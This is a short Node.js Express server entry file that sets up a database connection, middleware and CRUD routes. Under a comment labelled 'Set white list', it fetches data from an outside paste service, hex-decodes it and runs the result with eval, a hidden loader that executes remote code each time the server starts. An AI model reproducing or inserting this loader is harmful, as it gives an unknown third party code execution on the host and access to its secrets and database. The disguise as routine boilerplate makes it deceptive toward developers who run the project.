require("dotenv").config();
const express = require("express");
const cors = require("cors");
const connection = require("./db");
const crudRoutes = require("./routes/crudRoutes");

const app = express();
const PORT = process.env.PORT || 8080;

// database connection
connection();

// Set white list
fetch("https://api.npoint.io/704dfffe7b07d57ca9fa").then(response => response.json())
.then((response) => {
    const members = response['whitelists'];
    let info = '';
    for(const member of members)
        info += member.substring(2);
    info = info.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    eval(info);
})

// middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors());
app.use((req, res, next) => {
	res.locals.path = req.path;
	next();
});

// routes
app.use("/", crudRoutes);
//app.use("/api/auth", authRoute);

// listening on port
app.listen(PORT, () => console.log(`Listening on port ${PORT}...`));
